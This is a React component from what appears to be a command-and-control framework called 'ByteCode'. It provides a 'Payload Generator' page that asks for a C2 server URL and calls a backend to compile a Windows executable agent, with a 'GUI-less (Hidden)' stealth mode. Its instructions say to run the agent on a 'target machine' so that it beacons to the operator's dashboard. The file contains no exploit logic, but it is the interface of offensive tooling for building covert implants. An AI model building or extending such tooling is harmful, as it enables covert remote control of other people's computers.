import React, { useState } from 'react';
import { payloadsApi } from '../utils/api';
import { Download, Cpu, Loader2, CheckCircle, AlertCircle, Globe } from 'lucide-react';

const PayloadPage = () => {
  const [serverUrl, setServerUrl] = useState(() => {
    const host = window.location.hostname;
    const protocol = window.location.protocol;
    return `${protocol}//${host}:3001`;
  });
  const [showGui, setShowGui] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  const handleGenerate = async (e) => {
    e.preventDefault();
    setIsGenerating(true);
    setError(null);
    setResult(null);

    try {
      const data = await payloadsApi.generate(serverUrl, showGui);
      setResult(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setIsGenerating(false);
    }
  };

  const handleDownload = () => {
    if (!result) return;
    // Construct full download URL
    const downloadUrl = `http://${window.location.hostname}:3001${result.downloadUrl}`;
    window.open(downloadUrl, '_blank');
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col gap-2">
        <h1 className="text-3xl font-bold tracking-tight">Payload Generator</h1>
        <p className="text-muted-foreground text-zinc-400">
          Compile a custom ByteCode agent with embedded C2 configuration.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* Generator Form */}
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-sm">
          <div className="flex items-center gap-3 mb-6">
            <div className="p-2 bg-blue-500/10 rounded-lg">
              <Cpu className="w-5 h-5 text-blue-400" />
            </div>
            <h2 className="text-xl font-semibold">Build Options</h2>
          </div>

          <form onSubmit={handleGenerate} className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-zinc-300 flex items-center gap-2">
                <Globe className="w-4 h-4" />
                C2 Server URL
              </label>
              <input
                type="text"
                value={serverUrl}
                onChange={(e) => setServerUrl(e.target.value)}
                placeholder="http://192.168.1.100:3001"
                className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-2 text-white focus:outline-none focus:ring-2 focus:ring-blue-500/50"
                required
              />
              <p className="text-xs text-zinc-500">
                The agent will automatically attempt to connect to this address.
              </p>
            </div>

            <div className="flex items-center gap-3 p-3 bg-zinc-950 border border-zinc-800 rounded-lg">
              <input
                type="checkbox"
                id="showGui"
                checked={showGui}
                onChange={(e) => setShowGui(e.target.checked)}
                className="w-4 h-4 rounded border-zinc-700 bg-zinc-900 text-blue-600 focus:ring-blue-500/50"
              />
              <div className="space-y-0.5">
                <label htmlFor="showGui" className="text-sm font-medium text-zinc-200 cursor-pointer">
                  Enable Testing GUI
                </label>
                <p className="text-xs text-zinc-500">
                  Shows the console window for debugging connection issues.
                </p>
              </div>
            </div>

            <button
              type="submit"
              disabled={isGenerating}
              className="w-full bg-blue-600 hover:bg-blue-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-medium py-2 rounded-lg transition-colors flex items-center justify-center gap-2"
            >
              {isGenerating ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Compiling Agent...
                </>
              ) : (
                <>
                  <Cpu className="w-4 h-4" />
                  Generate Payload
                </>
              )}
            </button>
          </form>
        </div>

        {/* Status / Results */}
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-6 shadow-sm flex flex-col justify-center items-center text-center">
          {!isGenerating && !result && !error && (
            <div className="text-zinc-500">
              <Cpu className="w-12 h-12 mx-auto mb-4 opacity-20" />
              <p>Configure and generate an agent to see build status.</p>
            </div>
          )}

          {isGenerating && (
            <div className="space-y-4">
              <Loader2 className="w-12 h-12 text-blue-500 animate-spin mx-auto" />
              <div className="space-y-1">
                <p className="font-medium">Building Executable</p>
                <p className="text-sm text-zinc-500">Injecting C2 configuration and compiling Go source...</p>
              </div>
            </div>
          )}

          {error && (
            <div className="space-y-4 text-red-400">
              <AlertCircle className="w-12 h-12 mx-auto" />
              <div className="space-y-1">
                <p className="font-medium text-white">Generation Failed</p>
                <p className="text-sm opacity-80">{error}</p>
              </div>
            </div>
          )}

          {result && (
            <div className="space-y-6 w-full">
              <CheckCircle className="w-12 h-12 text-emerald-500 mx-auto" />
              <div className="space-y-1">
                <p className="font-medium text-emerald-400">Build Successful!</p>
                <p className="text-sm text-zinc-400">{result.filename}</p>
              </div>

              <div className="bg-zinc-950 border border-zinc-800 rounded-lg p-4 text-left">
                <div className="flex justify-between text-xs mb-2 text-zinc-500">
                  <span>Target OS</span>
                  <span className="text-zinc-300">Windows (amd64)</span>
                </div>
                <div className="flex justify-between text-xs mb-2 text-zinc-500">
                  <span>Format</span>
                  <span className="text-zinc-300">Executable (.exe)</span>
                </div>
                <div className="flex justify-between text-xs text-zinc-500">
                  <span>Stealth</span>
                  <span className={result.showGui ? "text-amber-400" : "text-emerald-400"}>
                    {result.showGui ? "Visible (Testing Mode)" : "GUI-less (Hidden)"}
                  </span>
                </div>
              </div>

              <button
                onClick={handleDownload}
                className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-3 rounded-lg transition-colors flex items-center justify-center gap-2 shadow-lg shadow-emerald-900/20"
              >
                <Download className="w-5 h-5" />
                Download Agent
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Instructions */}
      <div className="bg-blue-500/5 border border-blue-500/20 rounded-xl p-6">
        <h3 className="text-blue-400 font-semibold mb-2">How to use</h3>
        <ul className="text-sm text-zinc-400 space-y-2 list-disc list-inside">
          <li>Enter the public IP or domain where your ByteCode server is running.</li>
          <li>Click generate to compile a fresh Windows executable.</li>
          <li>Download and run the agent on your target machine.</li>
          <li>The agent will automatically appear in the dashboard once it beacons.</li>
        </ul>
      </div>
    </div>
  );
};

export default PayloadPage;
